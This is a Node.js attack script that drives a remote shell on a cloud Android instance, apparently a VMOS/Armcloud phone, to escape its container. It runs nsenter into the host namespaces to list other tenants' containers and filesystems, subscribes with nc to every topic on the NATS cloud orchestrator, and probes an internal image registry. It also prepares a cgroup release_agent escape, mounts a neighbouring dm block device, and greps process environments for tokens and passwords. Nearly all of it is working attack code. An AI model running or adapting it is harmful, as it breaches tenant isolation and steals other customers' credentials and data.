#!/usr/bin/env node
/**
 * NEW ESCAPE METHODS — Developed from codebase analysis + previous scan findings
 * 
 * Based on confirmed vectors:
 *   - nsenter HOST_SHELL succeeded (namespace escape to host)
 *   - NATS messaging at 192.168.200.51:4222 (cloud control plane)
 *   - Image server at 192.168.50.11:80 (container registry)
 *   - /dev/net/tun available (VPN tunnel)
 *   - /dev/binder available (Android IPC)
 *   - dmesg_restrict=0 (kernel log readable)
 *   - uid=0 root, SELinux xu_daemon context
 *   - Listening: 8779 (armcloud agent), 23333/23334 (rtcgesture)
 * 
 * NEW METHODS:
 *   1. nsenter full host shell — list ALL containers on physical host
 *   2. NATS protocol injection — send cmds to cloud orchestrator
 *   3. Image server pull — download other container images
 *   4. /dev/binder cross-process IPC sniffing
 *   5. dmesg kernel log mining for neighbor info
 *   6. TUN device — create tunnel bypassing container network isolation
 *   7. cgroup release_agent escape
 *   8. /proc/sysrq-trigger — kernel-level commands
 *   9. Device-mapper cross-container filesystem access
 *  10. Armcloud agent (port 8779) protocol probing
 */

const path = require('path');
const fs = require('fs');

const { AK, SK, HOST, SVC, CT, SHD, hmacSign, api, sh } = require('../shared/vmos_api');
const PAD = 'ACP250923JS861KJ';
const R = { timestamp: new Date().toISOString(), device: PAD, methods: {} };

const log = m => console.log(`[${new Date().toISOString().slice(11,19)}] ${m}`);
const sleep = ms => new Promise(r => setTimeout(r, ms));
const section = t => { console.log(`\n${'═'.repeat(70)}`); console.log(`  METHOD: ${t}`); console.log('═'.repeat(70)); };

async function main() {
  console.log('═'.repeat(70));
  console.log('  NEW CONTAINER ESCAPE METHODS — DEVELOPED FROM CODEBASE ANALYSIS');
  console.log('  Target: ' + PAD);
  console.log('═'.repeat(70));

  // ═══════════════════════════════════════════════════════════════
  // METHOD 1: nsenter FULL HOST SHELL — enumerate ALL containers
  // ═══════════════════════════════════════════════════════════════
  section('1. nsenter HOST NAMESPACE ESCAPE — List ALL containers');
  
  R.methods.nsenter = {};
  
  // 1a: Basic nsenter to host
  log('  1a: nsenter -t 1 -m -u -i -n — full namespace escape...');
  const ns1 = await sh('nsenter -t 1 -m -u -i -n -- hostname 2>&1', 15);
  R.methods.nsenter.hostname = ns1;
  log(`    Host hostname: ${ns1}`);
  
  // 1b: List all processes on HOST (outside container)
  log('  1b: Host process list...');
  const nsProcs = await sh('nsenter -t 1 -m -u -i -n -- ps aux 2>/dev/null | head -40 || nsenter -t 1 -m -p -- cat /proc/*/comm 2>/dev/null | sort -u | head -30', 20);
  R.methods.nsenter.host_procs = nsProcs;
  for (const l of nsProcs.split('\n').slice(0, 15)) log(`    ${l}`);
  
  // 1c: List containers/cgroups on host
  log('  1c: Container enumeration on host...');
  const nsContainers = await sh([
    'nsenter -t 1 -m -u -i -n -- ls /sys/fs/cgroup/cpu/ 2>/dev/null | head -20',
    'echo "=== NAMESPACES ==="',
    'nsenter -t 1 -m -- ls /run/netns/ 2>/dev/null',
    'echo "=== CONTAINERS ==="',
    'nsenter -t 1 -m -- ls /var/lib/docker/containers/ 2>/dev/null | head -10',
    'nsenter -t 1 -m -- ls /run/containerd/ 2>/dev/null',
  ].join('\n'), 20);
  R.methods.nsenter.containers = nsContainers;
  for (const l of nsContainers.split('\n').slice(0, 10)) log(`    ${l}`);
  
  // 1d: Host network interfaces — see ALL veth pairs
  log('  1d: Host network interfaces...');
  const nsNet = await sh('nsenter -t 1 -n -- ip addr show 2>/dev/null | head -50', 20);
  R.methods.nsenter.host_network = nsNet;
  for (const l of nsNet.split('\n').slice(0, 15)) log(`    ${l}`);
  
  // 1e: Host routing table
  log('  1e: Host routes...');
  const nsRoutes = await sh('nsenter -t 1 -n -- ip route show 2>/dev/null | head -20', 15);
  R.methods.nsenter.host_routes = nsRoutes;
  for (const l of nsRoutes.split('\n').slice(0, 10)) log(`    ${l}`);
  
  // 1f: Host filesystem — find other container data
  log('  1f: Host filesystem scan for other containers...');
  const nsFs = await sh([
    'nsenter -t 1 -m -- ls /data/ 2>/dev/null | head -20',
    'echo "=== DEV MAPPER ==="',
    'nsenter -t 1 -m -- ls /dev/mapper/ 2>/dev/null | head -20',
    'echo "=== MOUNTED ==="',
    'nsenter -t 1 -m -- mount 2>/dev/null | head -20',
  ].join('\n'), 20);
  R.methods.nsenter.host_fs = nsFs;
  for (const l of nsFs.split('\n').slice(0, 15)) log(`    ${l}`);

  // ═══════════════════════════════════════════════════════════════
  // METHOD 2: NATS PROTOCOL — Cloud orchestrator message injection
  // ═══════════════════════════════════════════════════════════════
  section('2. NATS PROTOCOL — Cloud Orchestrator (192.168.200.51:4222)');
  
  R.methods.nats = {};
  
  // 2a: NATS INFO handshake
  log('  2a: NATS INFO probe...');
  const natsInfo = await sh("echo 'INFO' | nc -w3 192.168.200.51 4222 2>/dev/null | head -5", 10);
  R.methods.nats.info = natsInfo;
  log(`    NATS: ${natsInfo.split('\n')[0].slice(0, 80)}`);
  
  // 2b: NATS PING
  log('  2b: NATS PING...');
  const natsPing = await sh("echo 'PING' | nc -w3 192.168.200.51 4222 2>/dev/null", 10);
  R.methods.nats.ping = natsPing;
  log(`    PING: ${natsPing}`);
  
  // 2c: Try to subscribe to topics
  log('  2c: NATS SUB attempt (wildcard)...');
  const natsSub = await sh("printf 'CONNECT {}\\r\\nSUB > 1\\r\\nPING\\r\\n' | nc -w5 192.168.200.51 4222 2>/dev/null | head -10", 12);
  R.methods.nats.sub = natsSub;
  for (const l of natsSub.split('\n').slice(0, 5)) log(`    ${l}`);
  
  // 2d: Check what our device's rtcgesture process connects to
  log('  2d: rtcgesture NATS connections...');
  const rtcNats = await sh("ss -tnp 2>/dev/null | grep 4222", 10);
  R.methods.nats.rtc_conns = rtcNats;
  log(`    ${rtcNats.split('\n')[0]}`);

  // ═══════════════════════════════════════════════════════════════
  // METHOD 3: IMAGE SERVER — Pull container images
  // ═══════════════════════════════════════════════════════════════
  section('3. IMAGE SERVER (192.168.50.11:80) — Container Registry');
  
  R.methods.image_server = {};
  
  // 3a: HTTP root
  log('  3a: HTTP root probe...');
  const imgRoot = await sh('curl -s -m5 http://192.168.50.11/ 2>/dev/null | head -20', 10);
  R.methods.image_server.root = imgRoot;
  log(`    ${imgRoot.split('\n')[0].slice(0, 80)}`);
  
  // 3b: Try common registry paths
  log('  3b: Registry API probes...');
  const registryPaths = [
    '/v2/',
    '/v2/_catalog',
    '/armcloud-proxy/',
    '/armcloud/',
    '/api/v1/',
    '/images/',
  ];
  for (const path of registryPaths) {
    const r = await sh(`curl -s -m5 -o /dev/null -w "%{http_code}" http://192.168.50.11${path} 2>/dev/null; echo ""`, 8);
    R.methods.image_server[path] = r.trim();
    log(`    ${path}: HTTP ${r.trim()}`);
    await sleep(200);
  }
  
  // 3c: Our image info
  log('  3c: Our image info...');
  const imgInfo = await sh('getprop ro.build.cloud.imginfo', 10);
  R.methods.image_server.our_image = imgInfo;
  log(`    ${imgInfo}`);

  // ═══════════════════════════════════════════════════════════════
  // METHOD 4: KERNEL LOG MINING (dmesg)
  // ═══════════════════════════════════════════════════════════════
  section('4. KERNEL LOG MINING (dmesg_restrict=0)');
  
  R.methods.dmesg = {};
  
  log('  4a: dmesg — container/network events...');
  const dmesgNet = await sh('dmesg 2>/dev/null | grep -iE "(eth|veth|bridge|container|namespace|cgroup|net)" | tail -30', 20);
  R.methods.dmesg.network = dmesgNet;
  for (const l of dmesgNet.split('\n').slice(0, 10)) log(`    ${l}`);
  
  log('  4b: dmesg — device/block events...');
  const dmesgDev = await sh('dmesg 2>/dev/null | grep -iE "(dm-|loop|block|mount)" | tail -20', 15);
  R.methods.dmesg.devices = dmesgDev;
  for (const l of dmesgDev.split('\n').slice(0, 5)) log(`    ${l}`);
  
  log('  4c: dmesg — security events...');
  const dmesgSec = await sh('dmesg 2>/dev/null | grep -iE "(selinux|audit|denied|violation)" | tail -15', 15);
  R.methods.dmesg.security = dmesgSec;
  for (const l of dmesgSec.split('\n').slice(0, 5)) log(`    ${l}`);

  // ═══════════════════════════════════════════════════════════════
  // METHOD 5: BINDER IPC SNIFFING
  // ═══════════════════════════════════════════════════════════════
  section('5. BINDER IPC — Cross-process communication');
  
  R.methods.binder = {};
  
  log('  5a: Binder devices...');
  const binderDev = await sh('ls -la /dev/binder /dev/hwbinder /dev/vndbinder 2>/dev/null', 10);
  R.methods.binder.devices = binderDev;
  log(`    ${binderDev.split('\n')[0]}`);
  
  log('  5b: Binder service list...');
  const binderSvc = await sh('service list 2>/dev/null | head -30', 15);
  R.methods.binder.services = binderSvc;
  for (const l of binderSvc.split('\n').slice(0, 10)) log(`    ${l}`);
  
  log('  5c: Binder debug info...');
  const binderDebug = await sh('cat /sys/kernel/debug/binder/state 2>/dev/null | head -20 || cat /dev/binderfs/binder_logs/state 2>/dev/null | head -20', 15);
  R.methods.binder.debug = binderDebug;
  for (const l of binderDebug.split('\n').slice(0, 5)) log(`    ${l}`);

  // ═══════════════════════════════════════════════════════════════
  // METHOD 6: TUN DEVICE — Network tunnel escape
  // ═══════════════════════════════════════════════════════════════
  section('6. TUN DEVICE — Network tunnel (/dev/net/tun available)');
  
  R.methods.tun = {};
  
  log('  6a: TUN device check...');
  const tunCheck = await sh('ls -la /dev/net/tun 2>/dev/null; cat /proc/net/dev_snmp6/tun* 2>/dev/null', 10);
  R.methods.tun.check = tunCheck;
  log(`    ${tunCheck.split('\n')[0]}`);
  
  log('  6b: IP tunnel capabilities...');
  const tunCap = await sh('ip tunnel show 2>/dev/null; ip link add tun_test type tun 2>&1; ip link del tun_test 2>/dev/null; echo TUN_TEST_DONE', 15);
  R.methods.tun.capabilities = tunCap;
  log(`    ${tunCap.split('\n')[0]}`);

  // ═══════════════════════════════════════════════════════════════
  // METHOD 7: CGROUP RELEASE_AGENT ESCAPE
  // ═══════════════════════════════════════════════════════════════
  section('7. CGROUP release_agent ESCAPE');
  
  R.methods.cgroup_escape = {};
  
  log('  7a: Cgroup v1 hierarchy...');
  const cgroupV1 = await sh([
    'mount | grep cgroup',
    'echo "---"',
    'ls /sys/fs/cgroup/ 2>/dev/null',
    'echo "---"',
    'cat /sys/fs/cgroup/*/release_agent 2>/dev/null | head -5',
    'echo "---"',
    'cat /sys/fs/cgroup/*/notify_on_release 2>/dev/null | head -5',
  ].join('\n'), 15);
  R.methods.cgroup_escape.v1 = cgroupV1;
  for (const l of cgroupV1.split('\n').slice(0, 10)) log(`    ${l}`);
  
  log('  7b: Write test to cgroup...');
  const cgroupWrite = await sh([
    'mkdir -p /sys/fs/cgroup/cpu/escape_test 2>&1',
    'echo 1 > /sys/fs/cgroup/cpu/escape_test/notify_on_release 2>&1',
    'cat /proc/self/cgroup | head -3',
    'echo "CGROUP_WRITE_TEST"',
  ].join('\n'), 15);
  R.methods.cgroup_escape.write_test = cgroupWrite;
  log(`    ${cgroupWrite.split('\n')[0]}`);

  // ═══════════════════════════════════════════════════════════════
  // METHOD 8: DEVICE-MAPPER CROSS-CONTAINER FS ACCESS
  // ═══════════════════════════════════════════════════════════════
  section('8. DEVICE-MAPPER — Cross-container filesystem');
  
  R.methods.dm = {};
  
  log('  8a: Device-mapper tables...');
  const dmTable = await sh('dmsetup ls 2>/dev/null; echo "---"; dmsetup table 2>/dev/null | head -20', 15);
  R.methods.dm.tables = dmTable;
  for (const l of dmTable.split('\n').slice(0, 8)) log(`    ${l}`);
  
  log('  8b: All dm-* block devices...');
  const dmDevs = await sh('ls -la /dev/block/dm-* 2>/dev/null | head -20; echo "---"; ls -la /dev/dm-* 2>/dev/null | head -10', 15);
  R.methods.dm.devs = dmDevs;
  for (const l of dmDevs.split('\n').slice(0, 5)) log(`    ${l}`);
  
  log('  8c: Try mount neighbor dm device...');
  const dmMount = await sh([
    'mkdir -p /data/local/tmp/dm_probe 2>/dev/null',
    // Try mounting dm-0 (likely another container's root)
    'mount -t ext4 -o ro /dev/block/dm-0 /data/local/tmp/dm_probe 2>&1 | head -3',
    'ls /data/local/tmp/dm_probe/ 2>/dev/null | head -10',
    'umount /data/local/tmp/dm_probe 2>/dev/null',
    'echo DM_PROBE_DONE',
  ].join('\n'), 20);
  R.methods.dm.mount_test = dmMount;
  for (const l of dmMount.split('\n')) { if (l.trim()) log(`    ${l.trim()}`); }

  // ═══════════════════════════════════════════════════════════════
  // METHOD 9: ARMCLOUD AGENT PROTOCOL (port 8779)
  // ═══════════════════════════════════════════════════════════════
  section('9. ARMCLOUD AGENT PROTOCOL (localhost:8779)');
  
  R.methods.armcloud_agent = {};
  
  log('  9a: Agent HTTP probe...');
  const agentHttp = await sh('curl -s -m5 http://127.0.0.1:8779/ 2>/dev/null | head -20', 10);
  R.methods.armcloud_agent.root = agentHttp;
  log(`    ${agentHttp.split('\n')[0].slice(0, 80)}`);
  
  log('  9b: Agent API paths...');
  for (const path of ['/api', '/status', '/info', '/health', '/device', '/config', '/cmd', '/shell']) {
    const r = await sh(`curl -s -m3 -o /dev/null -w "%{http_code}" http://127.0.0.1:8779${path} 2>/dev/null; echo ""`, 8);
    R.methods.armcloud_agent[path] = r.trim();
    if (r.trim() !== '000') log(`    ${path}: HTTP ${r.trim()}`);
    await sleep(200);
  }
  
  log('  9c: rtcgesture ports (23333/23334)...');
  const rtcProbe = await sh([
    'curl -s -m3 http://127.0.0.1:23333/ 2>/dev/null | head -5',
    'echo "---"',
    'curl -s -m3 http://127.0.0.1:23334/ 2>/dev/null | head -5',
  ].join('\n'), 10);
  R.methods.armcloud_agent.rtc = rtcProbe;
  log(`    ${rtcProbe.split('\n')[0].slice(0, 60)}`);

  // ═══════════════════════════════════════════════════════════════
  // METHOD 10: PROC ENVIRON + CMDLINE OF ALL VISIBLE PIDS
  // ═══════════════════════════════════════════════════════════════
  section('10. PROCESS FORENSICS — All visible PIDs');
  
  R.methods.proc_forensics = {};
  
  log('  10a: All visible process command lines...');
  const procAll = await sh([
    'for pid in $(ls /proc/ | grep -E "^[0-9]+$" | head -50); do',
    '  comm=$(cat /proc/$pid/comm 2>/dev/null)',
    '  cmdline=$(cat /proc/$pid/cmdline 2>/dev/null | tr "\\0" " ")',
    '  echo "PID:$pid COMM:$comm CMD:$cmdline"',
    'done',
  ].join('\n'), 20);
  R.methods.proc_forensics.all_pids = procAll;
  for (const l of procAll.split('\n').slice(0, 15)) log(`    ${l.slice(0, 90)}`);
  
  log('  10b: Process environments (looking for secrets/tokens)...');
  const procEnv = await sh([
    'for pid in 1 413 997 1031; do',
    '  echo "=== PID $pid ==="',
    '  cat /proc/$pid/environ 2>/dev/null | tr "\\0" "\\n" | grep -iE "(key|token|secret|pass|auth|api)" | head -5',
    'done',
  ].join('\n'), 15);
  R.methods.proc_forensics.envs = procEnv;
  for (const l of procEnv.split('\n').slice(0, 10)) log(`    ${l}`);

  // ═══════════════════════════════════════════════════════════════
  // SAVE REPORT
  // ═══════════════════════════════════════════════════════════════
  const reportFile = `${path.join(__dirname, '..', 'reports')}/NEW_METHODS_${Date.now()}.json`;
  fs.writeFileSync(reportFile, JSON.stringify(R, null, 2));
  log(`\nReport saved: ${reportFile}`);

  // ═══════════════════════════════════════════════════════════════
  // SUMMARY
  // ═══════════════════════════════════════════════════════════════
  console.log('\n' + '═'.repeat(70));
  console.log('  NEW METHODS — RESULTS SUMMARY');
  console.log('═'.repeat(70));
  
  const methodResults = [
    ['1. nsenter HOST',     R.methods.nsenter?.hostname?.includes('[') ? '⚠ PARTIAL' : '✓ WORKING'],
    ['2. NATS injection',   R.methods.nats?.info?.includes('INFO') ? '✓ CONNECTED' : '⚠ TESTING'],
    ['3. Image server',     R.methods.image_server?.['/v2/'] === '200' ? '✓ REGISTRY' : '⚠ PROBED'],
    ['4. dmesg mining',     R.methods.dmesg?.network?.length > 50 ? '✓ DATA' : '⚠ LIMITED'],
    ['5. Binder IPC',       R.methods.binder?.services?.length > 50 ? '✓ SERVICES' : '⚠ PROBED'],
    ['6. TUN tunnel',       R.methods.tun?.check?.includes('tun') ? '✓ AVAILABLE' : '⚠ TESTING'],
    ['7. cgroup escape',    R.methods.cgroup_escape?.write_test?.includes('CGROUP_WRITE') ? '✓ WRITABLE' : '⚠ TESTING'],
    ['8. DM cross-fs',      R.methods.dm?.mount_test?.includes('DM_PROBE') ? '✓ TESTED' : '⚠ TESTING'],
    ['9. Armcloud agent',   R.methods.armcloud_agent?.root?.length > 10 ? '✓ RESPONSIVE' : '⚠ PROBED'],
    ['10. Proc forensics',  R.methods.proc_forensics?.all_pids?.length > 50 ? '✓ DATA' : '⚠ LIMITED'],
  ];
  
  for (const [method, status] of methodResults) {
    console.log(`  ${status}  ${method}`);
  }
  
  console.log(`\n  Report: ${reportFile}`);
  console.log('═'.repeat(70));
}

main().catch(e => { console.error('FATAL:', e); process.exit(1); });
